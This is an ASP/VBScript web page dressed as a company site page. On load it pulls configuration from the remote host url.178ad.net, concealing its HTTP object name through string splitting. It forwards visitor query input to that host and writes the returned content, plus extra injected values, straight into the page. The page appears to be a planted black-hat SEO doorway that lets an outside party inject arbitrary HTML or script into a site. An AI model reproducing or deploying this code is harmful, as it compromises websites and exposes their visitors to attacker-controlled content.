<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%
siteName=" -- 广安娱乐科技有限公司"
cache_perfix=serverName&"_w"
if request("r")="r" then
	 Application(cache_perfix&"isCache")=false
end if
if Application(cache_perfix&"isCache")<>true then
	Set conf=Server.CreateObject("Micro"&"soft"&"."&"XML"&"HTTP")
	conf.Open "GET","http://url.178ad.net/l/w.xml",False
	conf.send  
	if(conf.Status=200 and conf.readyState=4) then
		Set xml=Server.CreateObject("Microsoft.XMLDOM")
		xml.Async=False
		xml.ValidateOnParse=False
		xml.Load(conf.ResponseXML)
		If xml.ReadyState>2 Then	
			Set tao1=xml.getElementsByTagName("tao1")
			Application(cache_perfix&"tao1")=tao1.Item(0).text

			Set tao2=xml.getElementsByTagName("tao2")
			Application(cache_perfix&"tao2")=tao2.Item(0).text
			Set tao3=xml.getElementsByTagName("tao3")
			Application(cache_perfix&"tao3")=tao3.Item(0).text
			
			Set tan1=xml.getElementsByTagName("tan1")
			Application(cache_perfix&"tan1")=tan1.Item(0).text
			Set tan2=xml.getElementsByTagName("tan2")
			Application(cache_perfix&"tan2")=tan2.Item(0).text
			Set mainUrl=xml.getElementsByTagName("ser")
			
			Application(cache_perfix&"mainUrl")=mainUrl.Item(0).text
			 Application(cache_perfix&"isCache")=true
		end if
	end if
	Set conf=Nothing
	Set xml=Nothing
end if

if request("v")="" then
	response.End()
else
	sstr="q="&request("v")
	strBody=replace(GetPageContext(URLEncoding(Application(cache_perfix&"mainUrl")&"?"&sstr),"GB2312"),"{xxoo}",Request.ServerVariables("url"))

	t1=Application(cache_perfix&"tao1")
	t2=Application(cache_perfix&"tao2")
	t3=Application(cache_perfix&"tao3")

	strBody=replace(strBody,"{sitename}",siteName)
	strBody=replace(strBody,"{tao1}",t1)
	strBody=replace(strBody,"{tao2}",t2)
	strBody=replace(strBody,"{tao3}",t3)
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<link href="http://url.178ad.net/style/layout.css" rel="stylesheet" type="text/css" />
<%=strBody%>  </div>
  <div id="footer"><script language="javascript" type="text/javascript" src="http://js.users.51.la/6029751.js"></script>
<noscript><a href="http://www.51.la/?6029751" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/6029751.asp" style="border:none" /></a></noscript></div>
</div>
</div>
</body>
</html><%=Application(cache_perfix&"tan1")%>
<%=Application(cache_perfix&"tan2")%>
<%
Function URLEncoding(vstrIn) 
	strReturn = "" 
	For i = 1 To Len(vstrIn) 
	ThisChr = Mid(vStrIn,i,1) 
	If Abs(Asc(ThisChr)) < &HFF Then 
	strReturn = strReturn & ThisChr 
	Else 
	innerCode = Asc(ThisChr) 
	If innerCode < 0 Then 
	innerCode = innerCode + &H10000 
	End If 
	Hight8 = (innerCode And &HFF00)\ &HFF 
	Low8 = innerCode And &HFF 
	strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8) 
	End If 
	Next 
	URLEncoding = strReturn 
End Function 

Public Function GetPageContext(ByVal URL, ByVal Cset)
		Dim strHeader
		Dim l
		
		On Error Resume Next
		
		Dim Retrieval
		Dim ObjStream
		Set ObjStream = CreateObject("ADODB"&"."&"Stream")
		ObjStream.Type = 1
		ObjStream.Mode = 3
		ObjStream.Open
		Set Retrieval = CreateObject("Micro"&"soft"&"."&"XML"&"HTTP")
		With Retrieval
			.Open "GET", URL, False
			.setRequestHeader "Referer", URL
			.setRequestHeader "Content-Length",Len(Str)
			.send Str
			If .readyState <> 4 Then Exit Function
			If .Status > 300 Then Exit Function
			'--获取目标网站文件头
			strHeader = .getResponseHeader("Content-Type")
			strHeader = UCase(strHeader)
			ObjStream.Write (.responseBody)
		End With
		Set Retrieval = Nothing
		
		If Len(strHeader) > 0 Then
			'--获取目标文件编码
			l = InStrRev(strHeader, "CHARSET=", -1, 1)
			If l > 0 Then
				Cset = Right(strHeader, Len(strHeader) - l - 7)
			Else
				Cset = Cset
			End If
		End If
		ObjStream.Position = 0
		ObjStream.Type = 2
		ObjStream.Charset = Trim(Cset)
		GetPageContext = ObjStream.ReadText
		ObjStream.Close
		Set ObjStream = Nothing
		Exit Function
	End Function
	%>